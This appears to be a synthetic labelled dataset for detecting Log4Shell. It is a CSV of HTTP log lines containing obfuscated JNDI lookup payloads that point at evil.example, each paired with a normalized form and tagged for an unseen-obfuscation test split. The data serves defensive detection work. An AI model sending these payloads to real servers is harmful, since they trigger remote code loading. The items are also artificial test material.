id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000085,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} HTTP/1.1,get /?q=${jndi:ldap://evil.example/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000086,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000087,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://evil.example/nested} | method: get | host: app.local | path: /login,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000088,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested},request from user-agent: ${jndi:ldap://evil.example/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000089,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://evil.example/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000090,2026-05-17,synthetic,GET /search?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://evil.example/nested} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000091,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/nested},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000092,2026-05-17,synthetic,GET /?q=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} HTTP/1.1,get /?q=${jndi:ldap://evil.example/nested} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000093,2026-05-17,synthetic,GET /api/check?debug=${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/nested} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000094,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://evil.example/nested} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000095,2026-05-17,synthetic,Request from User-Agent: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested},request from user-agent: ${jndi:ldap://evil.example/nested},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000096,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://evil.example/nested},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/nested},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000097,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} HTTP/1.1,get /?q=${jndi:ldap://evil.example/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000098,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000099,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://evil.example/lower} | method: get | host: app.local | path: /static/app.js,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000100,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower},request from user-agent: ${jndi:ldap://evil.example/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000101,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://evil.example/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000102,2026-05-17,synthetic,GET /search?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://evil.example/lower} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
LS-000103,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/lower},1,log4shell,nested_lookup_lower_upper_lookup,body,unseen_obfuscation_test,critical
LS-000104,2026-05-17,synthetic,GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} HTTP/1.1,get /?q=${jndi:ldap://evil.example/lower} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000105,2026-05-17,synthetic,GET /api/check?debug=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/lower} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000106,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://evil.example/lower} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000107,2026-05-17,synthetic,Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower},request from user-agent: ${jndi:ldap://evil.example/lower},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000108,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/lower},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://evil.example/lower},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000109,2026-05-17,synthetic,GET /?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} HTTP/1.1,get /?q=${jndi:ldap://evil.example/upper} http/1.1,1,log4shell,nested_lookup_lower_upper_lookup,minimal_query,unseen_obfuscation_test,critical
LS-000110,2026-05-17,synthetic,GET /api/check?debug=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/upper} http/1.1 host: app.local,1,log4shell,nested_lookup_lower_upper_lookup,uri_param,unseen_obfuscation_test,critical
LS-000111,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://evil.example/upper} | method: get | host: app.local | path: /search?q=boots,1,log4shell,nested_lookup_lower_upper_lookup,user_agent,unseen_obfuscation_test,critical
LS-000112,2026-05-17,synthetic,Request from User-Agent: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper},request from user-agent: ${jndi:ldap://evil.example/upper},1,log4shell,nested_lookup_lower_upper_lookup,user_agent_minimal,unseen_obfuscation_test,critical
LS-000113,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/upper},1,log4shell,nested_lookup_lower_upper_lookup,x_api_version,unseen_obfuscation_test,critical
LS-000114,2026-05-17,synthetic,GET /search?q=${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://evil.example/upper} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://evil.example/upper} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,nested_lookup_lower_upper_lookup,path,unseen_obfuscation_test,critical
